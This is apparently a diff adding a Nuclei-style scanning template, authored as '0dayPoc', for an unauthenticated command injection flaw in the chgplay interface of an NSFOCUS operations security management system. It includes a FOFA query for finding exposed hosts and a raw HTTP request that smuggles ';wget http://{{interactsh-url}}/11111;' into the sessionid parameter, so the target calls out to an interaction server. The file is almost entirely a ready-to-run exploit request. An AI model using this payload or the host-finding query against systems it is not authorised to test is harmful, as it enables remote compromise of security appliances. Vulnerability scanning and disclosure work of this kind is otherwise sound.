@@ -1,0 +1,28 @@
+id: nsfocus-om-chgplay-rce
+info:
+  name: "绿盟运维安全管理系统 chgplay 接口远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="'/needUsbkey.php?username='"
+    日期：2025-11-14
+    该系统 chgplay 接口存在远程代码执行缺陷，攻击者可通过构造恶意请求在目标服务器上执行任意系统命令，最终实现对目标系统的完全控制。此漏洞利用无需身份验证，且可直接通过网络层触发。
+  tags: 绿盟运维安全管理系统
+http:
+- raw:
+  - |
+    GET /webconf/log/chgplay?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&status=charset&speed=10&sessionid=;wget%20http://{{interactsh-url}}/11111; HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
